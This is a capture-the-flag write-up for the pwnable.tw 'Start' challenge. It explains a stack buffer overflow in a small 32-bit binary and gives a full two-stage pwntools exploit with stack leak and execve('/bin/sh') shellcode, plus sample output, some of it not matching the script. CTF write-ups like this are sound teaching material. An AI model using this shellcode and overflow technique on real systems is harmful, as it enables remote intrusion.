# pwnable.tw - Start (100 pts)

## Challenge Description
> Just a start.
> `nc chall.pwnable.tw 10000`

## Binary Analysis

### File Information
```
$ file start
start: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, not stripped
```

### Disassembly
```asm
08048060 <_start>:
 8048060:   push   %esp              ; Save original ESP
 8048061:   push   $0x804809d        ; Push return address (_exit)
 8048066:   xor    %eax,%eax         ; Clear registers
 8048068:   xor    %ebx,%ebx
 804806a:   xor    %ecx,%ecx
 804806c:   xor    %edx,%edx
 804806e:   push   $0x3a465443       ; Push "Let's start the CTF:"
 8048073:   push   $0x20656874       ;   (5 dwords = 20 bytes)
 8048078:   push   $0x20747261
 804807d:   push   $0x74732073
 8048082:   push   $0x2774654c
 8048087:   mov    %esp,%ecx         ; ECX = buffer pointer
 8048089:   mov    $0x14,%dl         ; EDX = 20 (length)
 804808b:   mov    $0x1,%bl          ; EBX = 1 (stdout)
 804808d:   mov    $0x4,%al          ; EAX = 4 (sys_write)
 804808f:   int    $0x80             ; write(1, "Let's start the CTF:", 20)
 8048091:   xor    %ebx,%ebx         ; EBX = 0 (stdin)
 8048093:   mov    $0x3c,%dl         ; EDX = 60 (length) ← VULNERABILITY!
 8048095:   mov    $0x3,%al          ; EAX = 3 (sys_read)
 8048097:   int    $0x80             ; read(0, buffer, 60)
 8048099:   add    $0x14,%esp        ; Adjust stack by 20
 804809c:   ret                      ; Return

0804809d <_exit>:
 804809d:   pop    %esp
 804809e:   xor    %eax,%eax
 80480a0:   inc    %eax
 80480a1:   int    $0x80             ; exit(0)
```

## Vulnerability

The program allocates a **20-byte buffer** on the stack but reads **60 bytes** from stdin. This classic buffer overflow allows us to:
1. Overwrite the return address (at offset 20)
2. Execute arbitrary code on the stack (no NX protection)

### Stack Layout
```
[ESP+0]  : "Let'" (string start, 20 bytes)
[ESP+20] : Return address (0x804809d → _exit)
[ESP+24] : Saved original ESP
```

## Exploitation Strategy

### Stage 1: Leak Stack Address
Since ASLR might be enabled, we need to leak a stack address first.

**Trick**: Return to `0x8048087` which will:
1. Write 20 bytes from current ESP (leaking the saved stack pointer)
2. Read 60 bytes again (giving us a second chance to exploit)
3. Return again

### Stage 2: Execute Shellcode
With the leaked stack address, we can:
1. Calculate where our shellcode will be placed
2. Send padding + shellcode_address + shellcode
3. Get a shell!

### Payload Structure
```
Stage 1: [AAAA...20 bytes...][0x08048087]
         ↑ padding          ↑ return to write/read gadget

Stage 2: [AAAA...20 bytes...][shellcode_addr][shellcode...]
         ↑ padding          ↑ return addr   ↑ execve("/bin/sh")
```

## Exploit Code

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'i386'

p = remote('chall.pwnable.tw', 10000)
p.recvuntil(b"CTF:")

# Stage 1: Leak stack address
payload1 = b'A' * 20 + p32(0x08048087)
p.send(payload1)

leak = p.recv(20)
stack_addr = u32(leak[:4])
log.success(f"Leaked stack: {hex(stack_addr)}")

# Stage 2: Execute shellcode
shellcode = asm('''
    xor eax, eax
    push eax
    push 0x68732f2f
    push 0x6e69622f
    mov ebx, esp
    xor ecx, ecx
    xor edx, edx
    mov al, 0xb
    int 0x80
''')

shellcode_addr = stack_addr + 20
payload2 = b'A' * 20 + p32(shellcode_addr) + shellcode
p.send(payload2)

p.interactive()
```

## Running the Exploit

```bash
$ python3 exploit.py
[+] Opening connection to chall.pwnable.tw on port 10000: Done
[+] Leaked stack: 0xffd35c20
[*] Shellcode address: 0xffd35c34
[+] Exploit sent! Enjoy your shell!
[*] Switching to interactive mode
$ cat /home/start/flag
FLAG{...}
```

## Key Takeaways

1. **No protections**: This binary has no NX, no stack canary, no PIE - pure old-school exploitation
2. **Code reuse**: By returning to existing code (0x8048087), we can leak information
3. **Two-stage exploit**: Leak first, then exploit with precise addresses
4. **Simple shellcode**: Just 23 bytes to spawn a shell with `execve("/bin/sh", NULL, NULL)`

## References
- [GEF 101 - Solving pwnable.tw/start by @_hugsy](https://blahcat.github.io/2017/08/11/gef-tutorial-solving-pwnable-start/)
- [Linux x86 Syscall Table](https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md)
